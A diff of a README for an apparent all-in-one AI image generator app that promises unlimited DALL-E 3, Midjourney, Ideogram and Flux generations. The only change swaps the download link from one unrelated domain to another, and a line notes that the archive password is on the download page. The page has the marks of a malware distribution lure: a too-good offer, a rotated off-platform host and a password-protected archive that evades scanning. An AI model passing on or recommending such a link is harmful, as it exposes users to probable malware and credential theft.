@@ -18,7 +18,7 @@ Access DALL-E 3, Midjourney, Ideogram, and Flux all from one app. Unlimited gene
 
 ## Download
 
-[![Download v4.0.0](https://img.shields.io/badge/Download_v4.0.0-ec4899?style=for-the-badge&logoColor=white)](https://forumconnect.uk/aiimggen)
+[![Download v4.0.0](https://img.shields.io/badge/Download_v4.0.0-ec4899?style=for-the-badge&logoColor=white)](https://dllvcrun.com/aiimggen)
 
 > The archive password is shown on the download page.
 
